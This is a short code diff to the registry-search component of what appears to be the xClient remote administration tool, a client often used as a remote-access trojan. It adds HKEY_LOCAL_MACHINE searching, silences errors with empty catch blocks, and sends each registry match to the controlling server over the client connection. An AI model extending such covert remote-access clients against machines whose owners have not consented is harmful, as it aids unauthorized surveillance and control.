@@ -144,6 +144,19 @@ namespace xClient.Core.Registry
                 Search(key);
         }
 
+        void Search(string rootKeyName)
+        {
+            try
+            {
+                using (RegistryKey key = Microsoft.Win32.Registry.LocalMachine.OpenWritableSubKeySafe(rootKeyName))
+                {
+                    Search(key);
+                }
+            }
+            catch
+            { }
+        }
+
         void Search(RegistryKey rootKey)
         {
             string rootKeyName = rootKey.Name.Substring(rootKey.Name.LastIndexOf('\\') + 1);
@@ -191,8 +204,13 @@ namespace xClient.Core.Registry
 
         private void EnqueueSubKeys(RegistryKey key, string parentPath)
         {
-            foreach (string name in key.GetSubKeyNames())
-                pendingKeys.Enqueue(string.Concat(parentPath, name));
+            try
+            {
+                foreach (string name in key.GetSubKeyNames())
+                    pendingKeys.Enqueue(string.Concat(parentPath, name));
+            }
+            catch
+            { }
         }
 
         private void ProcessKey(RegistryKey key, string keyName)
@@ -219,9 +237,11 @@ namespace xClient.Core.Registry
 
             if (MatchFound != null)
                 searcher.ReportProgress(0, match);
-            
+
             if (SearchComplete != null)
-                matches.Add(match);
+            {
+                new xClient.Core.Packets.ClientPackets.GetRegistryKeysResponse(match).Execute(xClient.Program.ConnectClient);
+            }
         }
         
         public bool IsBusy
